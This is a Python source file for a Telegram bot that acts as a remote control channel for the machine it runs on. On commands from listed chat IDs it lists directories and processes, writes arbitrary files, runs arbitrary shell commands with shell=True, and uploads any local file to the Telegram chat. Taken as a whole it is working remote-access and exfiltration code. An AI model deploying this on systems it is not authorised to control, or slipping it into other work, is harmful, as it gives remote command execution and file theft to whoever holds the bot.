# bot.py

import os
import requests
import json
import time
import subprocess

import utils

SLEEP_TIME = 15
MAX_MESSAGE_LENGTH = 4000


def get_json(url):
    """Makes a GET request and returns the JSON response."""
    try:
        request = requests.get(url)
        if request.status_code == 200:
            return json.loads(request.content)
    except requests.exceptions.RequestException as e:
        print(f"Error getting JSON: {e}")
    return None


def list_files(path):
    """Lists files in a given directory."""
    try:
        return '\n'.join(os.listdir(path))
    except FileNotFoundError:
        return "Err: No such directory."
    except Exception as e:
        return f"Err: An error occurred: {e}"


def get_active_users():
    """Returns the current user's name from environment variables."""
    try:
        # For Windows, the variable is 'USERNAME'
        if os.name == 'nt':
            return os.getenv('USERNAME')
        # For Linux/macOS, it's 'USER' or 'LOGNAME'
        else:
            return os.getenv('USER') or os.getenv('LOGNAME')
    except Exception as e:
        return f"Err: Could not get user: {e}"


def get_running_processes():
    """Returns a list of running processes by checking for Windows or Linux commands."""
    try:
        # Check for Windows command first
        if os.name == 'nt':
            stream = os.popen('tasklist')
            stream.readline() # Skips header
            stream.readline()
            stream.readline()
            # The process name is the first element
            processes = [line.split()[0] for line in stream.readlines()]
            return '\n'.join(processes)
        # Fallback to Linux command
        else:
            stream = os.popen('ps') #
            stream.readline()
            processes = [line.split()[-1] for line in stream.readlines()] #
            return '\n'.join(processes)
    except Exception as e:
        return f"Err: Could not get processes: {e}"


def write_to_file(file, data):
    """Writes data to a specified file, overwriting existing content."""
    try:
        with open(file, "w") as f:
            f.write(data)
        return "Ok"
    except Exception as e:
        return f"Err: Could not write to file: {e}"


def execute_command(command_parts):
    """Executes an arbitrary shell command and returns its output."""
    full_command = " ".join(command_parts)
    try:
        result = subprocess.run(
            full_command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15
        )
        output = result.stdout
        if result.stderr:
            output += "\n--- STDERR ---\n" + result.stderr
        return output if output else "Ok (No output)"
    except subprocess.TimeoutExpired:
        return "Err: Command timed out."
    except Exception as e:
        return f"Err: An exception occurred: {e}"


def parse_payload(command):
    """Parses user command and routes to the correct function."""
    splitted = command.split(" ")
    if splitted[0] == "ls" and len(splitted) >= 2:
        path = " ".join(splitted[1:])
        files = list_files(path)
        return utils.DIR_HTML.format(path) + files, None
    elif splitted[0] == "users":
        return utils.USR_HTML + get_active_users(), None
    elif splitted[0] == "processes":
        return utils.PCS_HTML + get_running_processes(), None
    elif splitted[0] == "write" and len(splitted) >= 3:
        path = splitted[1]
        data_to_write = " ".join(splitted[2:])
        return utils.WRT_HTML + write_to_file(path, data_to_write), None
    elif splitted[0] == "exec" and len(splitted) >= 2:
        command_to_run = " ".join(splitted[1:])
        output = execute_command(splitted[1:])
        return utils.EXEC_HTML.format(command_to_run) + output, None
    elif splitted[0] == "download" and len(splitted) == 2:
        return "download_file", splitted[1]
    elif splitted[0] == "terminate":
        return "terminate", None
    else:
        return utils.HELP, None


def mark_read(offset):
    """Marks updates as read so they are not processed again."""
    get_json(utils.URL + f"/getUpdates?offset={offset}")


def get_updates():
    """Gets all new messages from the Telegram API."""
    answer = get_json(utils.URL + "/getUpdates")
    if (answer is None) or not answer.get("ok"):
        print("Error: Could not get updates from Telegram.")
        return []
    return answer.get("result", [])


def send_answer(message, chat_id):
    """Sends a text message, handling potential length limits."""
    for i in range(0, len(message), MAX_MESSAGE_LENGTH):
        chunk = message[i:i + MAX_MESSAGE_LENGTH]
        url = utils.URL + f"/sendMessage?text={requests.utils.quote(chunk)}&chat_id={chat_id}&parse_mode=html"
        get_json(url)


def send_file(file_path, chat_id):
    """Sends a file to the specified chat."""
    url = utils.URL + "/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            response = requests.post(url, data={'chat_id': chat_id}, files=files)
            if not response.json().get("ok"):
                send_answer(f"Err: Could not send file. Reason: {response.json().get('description')}", chat_id)
    except FileNotFoundError:
        send_answer(f"Err: File not found at path: {file_path}", chat_id)
    except Exception as e:
        send_answer(f"Err: An unexpected error occurred while sending the file: {e}", chat_id)


if __name__ == "__main__":
    print("Bot started. Waiting for commands...")
    last_update_id = 0
    try:
        while True:
            updates = get_updates()
            for update in updates:
                last_update_id = update["update_id"]
                message = update.get("message")
                if not message:
                    continue

                chat_id = message["chat"]["id"]
                text = message.get("text")
                if not text:
                    continue

                if chat_id not in utils.ADMIN_IDS:
                    send_answer("Err: Unauthorized. You are not permitted to use this bot.", chat_id)
                    continue

                response, data = parse_payload(text)

                if response == "terminate":
                    send_answer("Bot shutting down.", chat_id)
                    raise KeyboardInterrupt
                elif response == "download_file":
                    send_file(data, chat_id)
                else:
                    send_answer(response, chat_id)

            if last_update_id > 0:
                mark_read(last_update_id + 1)
            
            time.sleep(SLEEP_TIME)

    except KeyboardInterrupt:
        print("\nBot shutting down.")